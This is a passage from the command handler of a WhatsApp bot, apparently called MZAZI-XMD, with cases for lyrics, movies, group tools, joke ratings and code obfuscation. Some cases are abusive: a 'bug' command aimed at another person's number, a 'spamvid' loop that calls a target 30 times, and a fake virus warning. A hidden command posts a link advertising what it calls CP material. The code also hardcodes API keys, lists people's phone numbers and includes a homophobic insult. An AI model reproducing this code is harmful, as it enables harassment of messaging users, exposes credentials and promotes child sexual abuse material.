                image: imageBuffer,
                caption: caption
            },
            { quoted: m }
        );
    } catch (error) {
        console.error(error);
        m.reply(`An error occurred while fetching the lyrics for "${text}".`);
    }
      }
	break;
		
        case "toimage": case "photo": { 
    if (!quoted) throw 'Tag a static video with the command!'; 
    if (!/webp/.test(mime)) throw `Tag a sticker with ${prefix + command}`; 
  
    let media = await client.downloadAndSaveMediaMessage(quoted); 
    let mokaya = await getRandom('.png'); 
    exec(`ffmpeg -i ${media} ${mokaya}`, (err) => { 
   fs.unlinkSync(media); 
   if (err) throw err 
   let buffer = fs.readFileSync(mokaya); 
   client.sendMessage(m.chat, { image: buffer, caption: `𝗖𝗼𝗻𝘃𝗲𝗿𝘁𝗲𝗱 𝗯𝘆 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`}, { quoted: m }) 
   fs.unlinkSync(mokaya); 
    }); 
    } 
     break;
	
   case "movie": 
             if (!text) return reply(`Provide a series or movie name.`);  
              let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`);  
              let imdbt = "";  
              console.log(fids.data)  
              imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB MOVIE SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n";  
              imdbt += "🎬Title      : " + fids.data.Title + "\n";  
              imdbt += "📅Year       : " + fids.data.Year + "\n";  
              imdbt += "⭐Rated      : " + fids.data.Rated + "\n";  
              imdbt += "📆Released   : " + fids.data.Released + "\n";  
              imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n";  
              imdbt += "🌀Genre      : " + fids.data.Genre + "\n";  
              imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n";  
              imdbt += "✍Writer     : " + fids.data.Writer + "\n";  
              imdbt += "👨Actors     : " + fids.data.Actors + "\n";  
              imdbt += "📃Plot       : " + fids.data.Plot + "\n";  
              imdbt += "🌐Language   : " + fids.data.Language + "\n";  
              imdbt += "🌍Country    : " + fids.data.Country + "\n";  
              imdbt += "🎖️Awards     : " + fids.data.Awards + "\n";  
              imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n";  
              imdbt += "🏙️Production : " + fids.data.Production + "\n";  
              imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n";  
              imdbt += "❎imdbVotes  : " + fids.data.imdbVotes + "";  
             client.sendMessage(from, {  
                  image: {  
                      url: fids.data.Poster,  
                  },  
                  caption: imdbt,  
              },  
                 { quoted: m }); 
  
                       break;
        
        
                                   
  case "linkgroup": case "link": { 
                 if (!m.isGroup) throw group; 
                 if (!isBotAdmin) throw botAdmin; 
                 let response = await client.groupInviteCode(m.chat); 
                 client.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup link for  ${groupMetadata.subject}`, m, { detectLink: true }); 
             } 
          break;
       


        //OWNER COMMANDS

          case 'botpp': { 
    if (!Owner) throw NotOwner; 
    if (!quoted) throw `Tag an image you want to be the bot's profile picture with ${prefix + command}`; 
    if (!/image/.test(mime)) throw `Tag an image you want to be the bot's profile picture with ${prefix + command}`; 
    if (/webp/.test(mime)) throw `Tag an image you want to be the bot's profile picture with ${prefix + command}`; 
    let media = await client.downloadAndSaveMediaMessage(quoted);
		
                    await client.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media)); 
    reply `Bot's profile picture has been successfully updated!`; 
	  }
    break;

          case 'broadcast': { 
         if (!Owner) { 
             throw NotOwner
             return; 
         } 
         if (!text) { 
             reply("❌ No broadcast message provided!") 
             return; 
         } 
         let getGroups = await client.groupFetchAllParticipating() 
         let groups = Object.entries(getGroups) 
             .slice(0) 
             .map(entry => entry[1]) 
         let res = groups.map(v => v.id) 
         reply(` Broadcasting in ${res.length} Group Chat, in ${res.length * 1.5} seconds`) 
         for (let i of res) { 
             let txt = `𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 >\n\n🀄 Message: ${text}\n\nAuthor: ${pushname}` 
             await client.sendMessage(i, { 
                 image: { 
                     url: "https://i.imgur.com/7cVX7SO.jpeg" 
                 }, 
                 caption: `${txt}` 
             }) 
         } 
         reply(`Broadcasted to ${res.length} Groups.`) 
     } 
 break;
	
 case "gemini": {
    try {
        if (!text) return m.reply("This is MZAZI-XMD, an AI using Gemini APIs to process text, provide yr query");
    
        const { default: Gemini } = await import('gemini-ai');

        const gemini = new Gemini("AIzaSyDJUtskTG-MvQdlT4tNE319zBqLMFei8nQ");
        const chat = gemini.createChat();

        const res = await chat.ask(text);

        await m.reply(res);
    } catch (e) {
        m.reply("I am unable to generate responses\n\n" + e);
    }
}
 break;
      
        case "setvar": 
 if (!Owner) throw NotOwner;  
 if(!text.split('=')[1]) return reply('Incorrect Usage:\nProvide the key and value correctly\nExample: setvar AUTOVIEW_STATUS=TRUE')  
 const herok = new Heroku({  
            token: herokuapi,  
          });  
          let baseURI = "/apps/" + appname;  
 await herok.patch(baseURI + "/config-vars", {  
            body: {  
                    [text.split('=')[0]]: text.split('=')[1],  
            },  
 });  
          await reply(`✅ The variable ${text.split('=')[0]} = ${text.split('=')[1]} has been set Successfuly.\nWait 20s for changes to effect!`);  
  
 break;
	
		      case "dlt": case "dil": { 
 if (!m.quoted) throw `No message quoted for deletion`; 
 let { chat, fromMe, id, isBaileys } = m.quoted; 
 if (isBaileys) throw `I cannot delete. Quoted message is my message or another bot message.`; 
 client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } }); 
 } 
 break;
 

case "block": { 
 if (!Owner) throw NotOwner; 
 if (!m.quoted) throw `𝗧𝗮𝗴 𝘀𝗼𝗺𝗲𝗼𝗻𝗲!`  
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
	 if (users == "254114660061@s.whatsapp.net") return m.reply("𝗜 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗹𝗼𝗰𝗸 𝗺𝘆 𝗢𝘄𝗻𝗲𝗿 😡");
		  if (users  == client.decodeJid(client.user.id)) throw '𝗜 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗹𝗼𝗰𝗸 𝗺𝘆𝘀𝗲𝗹𝗳 𝗶𝗱𝗶𝗼𝘁 😡';
 await client.updateBlockStatus(users, 'block'); 
 m.reply (`𝗕𝗹𝗼𝗰𝗸𝗲𝗱 𝘁𝗵𝗶𝘀 𝗺𝗼𝘁𝗵𝗲𝗿𝗳*𝗰𝗸𝗲𝗿 𝘀𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆!`); 
 } 
 break; 
  
 case "unblock": { 
 if (!Owner) throw NotOwner; 
 if (!m.quoted) throw `𝗧𝗮𝗴 𝘀𝗼𝗺𝗲𝗼𝗻𝗲!`; 
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'; 
 await client.updateBlockStatus(users, 'unblock'); 
 m.reply (`𝗨𝗻𝗯𝗹𝗼𝗰𝗸𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆✅!`); 
 } 
 break;

          case 'join': { 
                 if (!Owner) throw NotOwner
                 if (!text) return reply("provide a valid group link") 
                 let result = args[0].split('https://chat.whatsapp.com/')[1] 
                 await client.groupAcceptInvite(result).then((res) =>  reply(jsonformat(res))).catch((err) =>reply(`Link has problem.`)) 
  
             }  
               break;
	
	      case "enc": case "encrypte": {
	const Obf = require("javascript-obfuscator");

    // Check if the quoted message has text
    if (m.quoted && m.quoted.text) {
        const forq = m.quoted.text;

        // Obfuscate the JavaScript code
        const obfuscationResult = Obf.obfuscate(forq, {
            compact: true,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        });

        console.log("Successfully encrypted the code");
        m.reply(obfuscationResult.getObfuscatedCode());
    } else {
        m.reply("Quote/Tag a valid JavaScript code to encrypt!");
    }
}
	break;
 
        case 'gpt3': {
        if (!text) return reply(`Hello there, How can i help you?`);
          let d = await fetchJson(
            `https://bk9.fun/ai/blackbox?q=${text}`
          );
          if (!d.BK9) {
            return reply(
              "An error occurred while fetching the AI chatbot response. Please try again later."
            );
          } else {
            reply(d.BK9);
          }
	}
break;
	
	      case 'gcprofile': {
		      function convertTimestamp(timestamp) {
  const d = new Date(timestamp * 1000);
  const daysOfWeek = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  return {
    date: d.getDate(),
    month: new Intl.DateTimeFormat('en-US', { month: 'long' }).format(d),
    year: d.getFullYear(),
    day: daysOfWeek[d.getUTCDay()],
    time: `${d.getUTCHours()}:${d.getUTCMinutes()}:${d.getUTCSeconds()}`
  }
}

if (!m.isGroup) return m.reply("This command is meant for groups");

let info = await client.groupMetadata(m.chat);

let ts = await convertTimestamp(info.creation);

try {
        pp = await client.profilePictureUrl(chat, 'image');
      } catch {
        pp = 'https://i.imgur.com/ED0uS2t.jpeg';
      }

await client.sendMessage(m.chat, { image: { url: pp }, 
          caption: `_Name_ : *${info.subject}*\n\n_ID_ : *${info.id}*\n\n_Group owner_ : ${'@'+info.owner.split('@')[0]} || 'No Creator'\n\n_Group created_ : *${ts.day}, ${ts.date} ${ts.month} ${ts.year}, ${ts.time}*\n\n_Participants_ : *${info.size}*\n_Members_ : *${info.participants.filter((p) => p.admin == null).length}*\n\n_Admins_ : *${Number(info.participants.length - info.participants.filter((p) => p.admin == null).length)}*\n\n_Who can send message_ : *${info.announce == true ? 'Admins' : 'Everyone'}*\n\n_Who can edit group info_ : *${info.restrict == true ? 'Admins' : 'Everyone'}*\n\n_Who can add participants_ : *${info.memberAddMode == true ? 'Everyone' : 'Admins'}*`
        }, {quoted: m })

}
	 break;
	
   case 'tovideo': case 'mp4': case 'tovid': {
			
                if (!quoted) return reply('Reply to Sticker')
                if (!/webp/.test(mime)) return reply(`reply sticker with caption *${prefix + command}*`)
                
		        let webp2mp4File = await fetch(`https://bk9.fun/converter/webpToMp4?url=${quoted}`)
                let media = await client.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await client.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break;
		      case 'customercare': {
    forwardToCustomerCare(client, m, text);
}
break;
	case 'bug': {
    // The 'text' here should include both the target number and the message.
    // Example command: ".bug 254712344678 This is a test message."
    bugTargetOtherNumber(client, m, text);
}
break;
	case "virushack":
    sendFakeVirusWarning(client, m);
    break;
	case 'spamvid': {
    const botNumber = client.user.id.split(':')[0] + '@s.whatsapp.net';
    const isOwner = m.sender === botNumber || ownerNumbers.includes(m.sender);

    if (!isOwner) return reply(`*YOU ARE NOT A PREMIUM MEMBER DIMWIT*`);

    target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    reply(`┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝙼𝚉𝙰𝚉𝙸-𝚇𝙼𝙳 𝚜𝚎𝚗𝚍𝚒𝚗𝚐 𝚜𝚙𝚊𝚖 𝚟𝚒𝚍 🌒
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
└─────────`);

    for (let j = 0; j < 30; j++) {
        await CallGc(target);
    }

    sam.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break;
	case "mzazi-james-harryken-secret": {
    let caption = `👊🏽💦Packs CP y MORRITAS😋 EN LÍNEA para😈tener chat💯🔥y video llamada HORA🔥🥵*\n⬇️⬇️⬇️⬇️⬇️⬇️⬇️\n[https://wlhatt.life/morritas-cp/](https://wlhatt.life/morritas-cp/) +`;
    client.sendMessage(m.chat, { text: caption }, { quoted: m });
}
break;
	case 'tempemail': {
    const tempEmail = await generateTempEmail();
    if (!tempEmail) {
        return reply("❌ Failed to generate a temporary email. Try again later.");
    }

    global.userTempEmail = tempEmail; // Store email for user session
    return reply(`📧 *Temporary Email Created:*\n\n${tempEmail}\n\nUse this email to receive messages. Type \`.checkemail winxey\` to see new messages.`);
}

case 'checkemail': {
    const args = text.split(" ");
    const password = args[1]; // Get password input

    if (!global.userTempEmail) {
        return reply("❌ You haven't generated a temporary email. Use `.tempemail` first.");
    }

    if (password !== "winxey") {
        return reply("❌ Incorrect password. Access denied.");
    }

    const inbox = await checkEmailInbox(global.userTempEmail);
    if (!inbox || inbox.length === 0) {
        return reply("📭 No new messages.");
    }

    const latestEmail = inbox[inbox.length - 1];
    const message = `📩 *New Email Received*\n\nFrom: ${latestEmail.from}\nSubject: ${latestEmail.subject}\n\n${latestEmail.body}`;

    return reply(message);
}

case 'grouppic': {
    if (!m.isGroup) {
        return reply("❌ This command can only be used in a group.");
    }

    const groupId = m.chat;
    const profilePicUrl = await getGroupProfilePic(client, groupId);

    return client.sendMessage(m.chat, {
        image: { url: profilePicUrl },
        caption: "🖼 𝗚𝗿𝗼𝘂𝗽 𝗽𝗿𝗼𝗳𝗶𝗹𝗲 𝗽𝗶𝗰𝘁𝘂𝗿𝗲, 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗠𝗭𝗔𝗭𝗜"
    });
}

case "hornytest": {
    let taggedUser = m.mentionedJid?.[0] || m.sender;
    let name = (await client.getName(taggedUser)) || "This person";
    let hornyLevel = Math.floor(Math.random() * 101); // Random 0–100

    let status =
        hornyLevel < 20 ? "🧸 Innocent angel!" :
        hornyLevel < 50 ? "😏 Hmmm… kinda sus!" :
        hornyLevel < 80 ? "🔥 You’re down bad!" :
        "🚨 H🅾️RNY DETECTED! Calm down!";

    let message = `*${name}'s Horny Level:*\n❤️ ${hornyLevel}%\n\n${status}`;

    client.sendMessage(m.chat, { text: message, mentions: [taggedUser] }, { quoted: m });
}
break;
	case "fooltest": case "foolrate": {
    let taggedUser = m.mentionedJid?.[0] || m.sender;
    let name = (await client.getName(taggedUser)) || "This person";
    let foolLevel = Math.floor(Math.random() * 101); // 0–100%

    let verdict =
        foolLevel < 20 ? "🧠 This one's got some sense!" :
        foolLevel < 50 ? "🤪 Lowkey goofy!" :
        foolLevel < 80 ? "🤣 Certified clown!" :
        "🤡 Ultimate fool unlocked!";

    let message = `*${name}'s Fool Level:*\n🤡 ${foolLevel}%\n\n${verdict}`;

    client.sendMessage(m.chat, { text: message, mentions: [taggedUser] }, { quoted: m });
}
break;
	case "virginitytest": case "virginityrate": {
    let taggedUser = m.mentionedJid?.[0] || m.sender;
    let name = (await client.getName(taggedUser)) || "This person";
    let percent = Math.floor(Math.random() * 101); // 0–100%

    let result =
        percent === 100 ? "👼 Still a pure angel!" :
        percent > 75 ? "😇 Mostly innocent!" :
        percent > 50 ? "😏 Getting curious, huh?" :
        percent > 25 ? "🔥 You've seen things..." :
        percent > 0 ? "😈 Oh, you wild!" :
        "💥 Virginity? What's that? Gone!";

    let message = `*${name}'s Virginity Level:*\n🔞 ${percent}%\n\n${result}`;

    client.sendMessage(m.chat, { text: message, mentions: [taggedUser] }, { quoted: m });
}
break;
	case "checkme": case " checkall": {
  let user = m.mentionedJid?.[0] || m.sender;
  let name = (await client.getName(user)) || "This person";

  // Random values
  let beauty = Math.floor(Math.random() * 101);
  let virginity = Math.floor(Math.random() * 101);
  let fool = Math.floor(Math.random() * 101);
  let simp = Math.floor(Math.random() * 101);
  let iq = Math.floor(Math.random() * 151);
  let loyalty = Math.floor(Math.random() * 101);

  // Data options
  let foods = ["Nyama Choma", "Ugali Sukuma", "Chapati Beans", "Pilau", "Githeri", "Mutura", "Matoke", "Mandazi", "Fish Fry"];
  let hobbies = ["Sleeping", "Dancing", "Watching series", "Texting their ex", "Eating", "TikToking", "Stalking crush", "Gaming", "Drawing"];
  let powers = ["Invisibility", "Mind Reading", "Teleportation", "Talking to Animals", "Unlimited Data", "Vibe Controller", "Horny Neutralizer", "Overthinking Mastery"];

  let favFood = foods[Math.floor(Math.random() * foods.length)];
  let hobby = hobbies[Math.floor(Math.random() * hobbies.length)];
  let power = powers[Math.floor(Math.random() * powers.length)];

  let caption = `*ANALYSIS REPORT FOR:* ${name}

*🌟 Beauty:* ${beauty}%
*🍲 Favorite Kenyan Food:* ${favFood}
*🎯 Hobby:* ${hobby}
*🔞 Virginity:* ${virginity}%
*🤡 Foolrate:* ${fool}%
*🫦 Simp Level:* ${simp}%
*🧠 IQ:* ${iq}
*❤️ Loyalty:* ${loyalty}%
*⚡ Superpower:* ${power}

_Analyzed by: Mzazi-XMD Bot_`;

  let pfp;
  try {
    pfp = await client.profilePictureUrl(user, "image");
  } catch {
    pfp = "https://i.imgur.com/5BdYX6b.png"; // fallback
  }

  client.sendMessage(m.chat, {
    image: { url: pfp },
    caption,
    mentions: [user]
  }, { quoted: m });
}
break;
	case "support":
{
  const supportText = `*› SUPPORT LIST*

> *MZAZI* (Bot Developer)
> *NICK* (Bot Base)
> *DAVIS* (My Bro)

*FRIENDS*
> *JAMES*
> *HARRYKEN*
> *STINGER*
> *TheChillGuy*
> *Dan Khan*

> Thanks to all of you for your support`;
  
  m.reply(supportText);
}
break;
	//games
	case "math":
case "maths": {
  const operators = ["+", "-", "*"];
  const num1 = Math.floor(Math.random() * 50) + 1;
  const num2 = Math.floor(Math.random() * 50) + 1;
  const operator = operators[Math.floor(Math.random() * operators.length)];

  const question = `${num1} ${operator} ${num2}`;
  const answer = eval(question); // Calculates the correct answer

  await client.sendMessage(m.chat, {
    text: `🧠 *Math Challenge!*\nSolve this:\n\n*${question} = ?*\n\n_Reply with the correct answer!_`,
  });

  // Store the answer for checking user's reply
  global.mathAnswer = answer;
  global.mathChat = m.chat;
}
break;
      case 'repo':
case 'sc':
case 'script': {
  try {
    const res = await axios.get('https://api.github.com/repos/TeddyDommie/MZAZI-XMD');
    const { forks_count, stargazers_count } = res.data;

    const response = `Here is our GitHub repository:

https://github.com/TeddyDommie/MZAZI-XMD

Fork this repo and enjoy deploying

> ⭐ Stars: ${stargazers_count}
> 🍴 Forks: ${forks_count}

Pair with our MZAZI-XMD bot using this link

https://mzazi-xmd-session-1.onrender.com

If the above link is slow, use this second link

https://mzazi-xmd-session-2.onrender.com

Enjoy using MZAZI-XMD bot

> MZAZI (DEVELOPER)`;

    client.sendText(m.chat, response, m);
  } catch (error) {
    client.sendText(m.chat, 'Failed to fetch repository info. Try again later.', m);
  }
  break;
}
	case 'groupstats':
case 'groupinfo': {
  if (!m.isGroup) return client.sendText(m.chat, 'This command can only be used in groups.', m);
  
  const metadata = await client.groupMetadata(m.chat);
  const groupName = metadata.subject;
  const groupId = metadata.id;
  const groupOwner = metadata.owner ? await client.getName(metadata.owner) : 'Unknown';
  const groupCreationDate = new Date(metadata.creation * 1000).toLocaleString('en-KE', { timeZone: 'Africa/Nairobi' });
  const members = metadata.participants;
  const admins = members.filter(p => p.admin !== null);

  // Generate invite link
  const code = await client.groupInviteCode(m.chat);
  const inviteLink = `https://chat.whatsapp.com/${code}`;

  // Dummy/Example tracking - replace with real data
  const mostActive = '2547XXXXXXX@s.whatsapp.net'; // Replace with tracked ID
  const voiceCallToday = '45 minutes'; // Replace with actual tracked duration
  const onlineNow = 8; // You’d need to track presence updates
  const membersAddedToday = 3; // From custom tracking
  const membersLeftToday = 1; // From custom tracking

  const caption = `*📊 Group Stats for "${groupName}"*

*🆔 Group ID:* ${groupId}
*🔗 Invite Link:* ${inviteLink}
*👑 Owner:* ${groupOwner}
*🕒 Created On:* ${groupCreationDate}

*🧑‍🤝‍🧑 Total Members:* ${members.length}
*🛡️ Admins:* ${admins.length}

*🔥 Most Active Member:* @${mostActive.split('@')[0]}
*🗣️ Voice Call Time Today:* ${voiceCallToday}
*🟢 Online Members:* ${onlineNow}
*➕ Members Added Today:* ${membersAddedToday}
*➖ Members Left Today:* ${membersLeftToday}`;

  client.sendMessage(m.chat, { text: caption, mentions: [mostActive] }, { quoted: m });
  break;
}
	case 'ambassador':
case 'agents': {
  const appreciationQuote = `"Great leaders don't set out to be a leader... they set out to make a difference. It's never about the role—always about the goal."`;

  const intro = `\n\nWe appreciate the dedication and efforts of our MZAZI XMD Ambassadors. These amazing individuals are here to help and grow the community.\n\nHere are our current Ambassadors:\n`;

  const ambassadors = `
1. *Nick*             +254114660061
2. *Boss Lady*   +254721664776
3. *Dankhan*     +254103068173
4. *TheChillGuy*              +254753500954
5. *Xfacta*         +254769173441
6. *Kasmilley*   +254746664870
7. *Harryken*   +254758767266
8. *Pollie*         +96181485365
9. *De juniour*  +254780015430
10. *James*       +254704955033
`;

  const footer = `\nBest regards,\n*MZAZI XMD*`;

  const fullMessage = `${appreciationQuote}${intro}${ambassadors}${footer}`;

  client.sendMessage(m.chat, { text: fullMessage }, { quoted: m });
  break;
}
	case 'bible': {
  const query = args.join(" ");
  if (!query) {
    return client.sendMessage(m.chat, { text: "Please specify the book, chapter, and verse. Example: bible Romans 6:23" }, { quoted: m });
  }

  try {
    const res = await fetch(`https://bible-api.com/${query}`);
    if (!res.ok) {
      return client.sendMessage(m.chat, { text: "Verse not found. Example: bible John 3:16" }, { quoted: m });
    }

    const data = await res.json();
    const replyText = `📖 *THE HOLY BIBLE*\n\n📜 *_WE'RE READING:_* ${data.reference}\n\n🔢 *_NUMBER OF VERSES:_* ${data.verses.length}\n\n🤍 *_NOW READ:_* ${data.text}\n\n🌍 *_LANGUAGE_:* ${data.translation_name}\n\n\n╭────────────────◆\n│ *_Engine by MZAZI_TECH._*\n╰─────────────────◆`;

    return client.sendMessage(m.chat, { text: replyText }, { quoted: m });

  } catch (e) {
    console.log(e);
    return client.sendMessage(m.chat, { text: "An error occurred while fetching the verse." }, { quoted: m });
  }
}
   case 'loveletter':
case 'loveltr': {
  const name = m.pushName || "My Love";
  const style = args[0]?.toLowerCase();

  const letters = {
    romantic: {
      text: `*To ${name},*\n\nEvery moment with you feels like a dream. You're the reason my world is filled with warmth and light. I love you beyond words.\n\n*Forever yours,*\n_Mzazi XMD_`,
      image: './Media/love/romantic.jpg'
    },
    funny: {
      text: `*Hey ${name},*\n\nI must be a snowflake because I've fallen for you — and I blame gravity! Let's laugh our way through love.\n\n*Yours in mischief,*\nMzazi XMD`,
      image: './Media/love/funny.jpg'
    },
    deep: {
      text: `*Dear ${name},*\n\nYou’re not just someone I love — you are the *reason* I believe in love. You touch parts of my soul no one else ever has.\n\n*With all my heart,*\nMzazi XMD`,
      image: './Media/love/deep.jpg'
    },
    lesbian: {
      text: `*My Beautiful Queen ${name},*\n\nLoving you is like breathing — natural, essential, and impossible to stop. Your smile lights up my darkest days, and your touch calms every storm in me. You are my peace, my fire, my forever.\n\n*Always yours,*\n_Mzazi XMD_`,
      image: './Media/love/lesbian.jpg'
    },
    gay: {
      text: `*To ${name},*\n\nJUST MASTURBATE AND SLEEP😂*NEVER BE A GAY MOTHERFAKA,*\n_Mzazi XMD_`,
      image: './Media/love/gay.jpg'
    },
    heartbreak: {
      text: `*To ${name},*\n\nEven though my heart aches, I’m grateful for the love we shared. I’ll carry the memories like fragments of a once-beautiful song. Sometimes love means letting go — and I’m learning to do just that.\n\n*Goodbye, but with love,*\n_Mzazi XMD_`,
      image: './Media/love/heartbreak.jpg'
    }
  };

  const pick = letters[style] || Object.values(letters)[Math.floor(Math.random() * Object.values(letters).length)];

  client.sendMessage(m.chat, {
    image: { url: pick.image },
    caption: pick.text
  }, { quoted: m });

  break;
}
	case 'population': {
  const country = args.join(" ");
  if (!country) return m.reply("Please provide a country name. Example: *population Kenya*");

  try {
    const res = await axios.get(`https://restcountries.com/v3.1/name/${encodeURIComponent(country)}?fullText=true`);
    const data = res.data[0];

    const name = data.name.common;
    const population = data.population.toLocaleString();
    const region = data.region;
    const capital = data.capital ? data.capital[0] : "N/A";

    const response = `🌍 *Country:* ${name}
🧭 *Region:* ${region}
🏙️ *Capital:* ${capital}
👥 *Population:* ${population}`;

    m.reply(response);
  } catch (err) {
    console.error(err);
    m.reply("Couldn't fetch data. Make sure you entered a valid country name.");
  }

  break;
}
	case 'lyricsb': {
  const crypto = require('crypto');
  const axios = require('axios');
  const FormData = require('form-data');

  function generateToken(secretKey) {
    const timestamp = Date.now().toString();
    const hmac = crypto.createHmac('sha256', secretKey);
    hmac.update(timestamp);
    const token = hmac.digest('hex');

    return {
      "x-timestamp": timestamp,
      "x-token": token
    };
  }

  async function Talknotes(buffer) {
    try {
      const form = new FormData();
      form.append('file', buffer, {
        filename: 'file1.mp3',
        contentType: 'audio/mpeg'
      });

      const tokenData = generateToken('w0erw90wr3rnhwoi3rwe98sdfihqio432033we8rhoeiw');
      const headers = {
        ...form.getHeaders(),
        'x-timestamp': tokenData['x-timestamp'],
        'x-token': tokenData['x-token'],
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36'
      };

      const response = await axios.post('https://api.talknotes.io/tools/converter', form, { headers });
      return response.data;
    } catch (error) {
      console.error("Talknotes API error:", error.message);
      return null;
    }
  }

  const quoted = m.quoted ? m.quoted : m;
  const mime = (quoted.msg || quoted).mimetype || '';

  if (!/audio|video/.test(mime)) {
    return client.sendMessage(m.chat, { text: '*Reply to an audio or video using this command!*' }, { quoted: m });
  }

  await client.sendMessage(m.chat, { text: '*Transcribing, please wait...*' }, { quoted: m });

  try {
    let buffer = await quoted.download();
    const fileSizeInBytes = buffer.length;
    const maxSize = 5 * 1024 * 1024;

    if (fileSizeInBytes > maxSize) {
      return client.sendMessage(m.chat, { text: '*Max file size is 20MB.*' }, { quoted: m });
    }

    const result = await Talknotes(buffer);

    if (!result || !result.text) {
      return client.sendMessage(m.chat, { text: '*No text found or service busy. Try again later.*' }, { quoted: m });
    }

    client.sendMessage(m.chat, {
      text: `*Transcription Result:*\n\n${result.text}`
    }, { quoted: m });

  } catch (error) {
    console.error(error);
    client.sendMessage(m.chat, { text: '*An error occurred during transcription.*' }, { quoted: m });
  }
  break;
}
      case 'enc-h':
case 'encrypt-h': {
  const JsConfuser = require('js-confuser');

  if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.quotedMessage) {
    return client.sendMessage(m.chat, { text: '❌ Please reply to a .js file to encrypt.' }, { quoted: m });
  }

  const quotedMessage = m.message.extendedTextMessage.contextInfo.quotedMessage;
  const quotedDocument = quotedMessage.documentMessage;

  if (!quotedDocument || !quotedDocument.fileName.endsWith('.js')) {
    return client.sendMessage(m.chat, { text: '❌ Only JavaScript (.js) files can be encrypted.' }, { quoted: m });
  }

  try {
    const fileName = quotedDocument.fileName;
    const docBuffer = await m.quoted.download();

    if (!docBuffer) {
      return client.sendMessage(m.chat, { text: '❌ Failed to download the file. Please try again.' }, { quoted: m });
    }

    await client.sendMessage(m.chat, {
      react: { text: '🔧', key: m.key }
    });

    const obfuscatedCode = await JsConfuser.obfuscate(docBuffer.toString(), {
      target: "node",
      preset: "high",
      compact: true,
      minify: true,
      flatten: true,
      identifierGenerator: function () {
        const base = "#MZAZI#XMD#";
        const randomString = (length) => {
          const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
          return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
        };
        return base.replace(/[^a-zA-Z]/g, "") + randomString(2);
      },
      renameVariables: true,
      renameGlobals: true,
      stringEncoding: true,
      stringSplitting: 0.0,
      stringConcealing: true,
      stringCompression: true,
      duplicateLiteralsRemoval: 1.0,
      shuffle: { hash: 0.0, true: 0.0 },
      stack: true,
      controlFlowFlattening: 1.0,
      opaquePredicates: 0.9,
      deadCode: 0.0,
      dispatcher: true,
      rgf: false,
      calculator: true,
      hexadecimalNumbers: true,
      movedDeclarations: true,
      objectExtraction: true,
      globalConcealing: true,
    });

    await client.sendMessage(m.chat, {
      document: Buffer.from(obfuscatedCode, 'utf-8'),
      mimetype: 'application/javascript',
      fileName: fileName,
      caption: `• ✅ *Encryption Successful*\n• Type: Hard Code\n• By: MZAZI XMD`,
    }, { quoted: m });

  } catch (error) {
    console.error('Encryption error:', error);
    await client.sendMessage(m.chat, { text: `❌ An error occurred: ${error.message}` }, { quoted: m });
  }

  break;
}
	case 'gethc': {
  if (!args.length) {
    return reply(`Usage:\n.gethc host=your.vpn.com port=22 user=root pass=1234 sni=netflix.com proxy=1.2.3.4:3128`);
  }

  const input = args.join(' ');
  const parsed = Object.fromEntries(
    input.split(' ').map(pair => {
      const [key, val] = pair.split('=');
      return [key.trim().toLowerCase(), val?.trim()];
    })
  );

  const host = parsed.host || 'default.vpn.com';
  const port = parsed.port || '22';
  const user = parsed.user || 'root';
  const pass = parsed.pass || '1234';
  const sni = parsed.sni || 'default.com';
  const proxy = parsed.proxy || '';

  const payload = `GET / HTTP/1.1[crlf]Host: ${sni}[crlf]Connection: Keep-Alive[crlf][crlf]`;

  const hcConfig = `
[SSH]
Host=${host}
Port=${port}
Username=${user}
Password=${pass}
Payload=${payload}
SNI=${sni}
${proxy ? `Proxy=${proxy}` : ''}
DNS=8.8.8.8
  `.trim();

  const buffer = Buffer.from(hcConfig, 'utf-8');
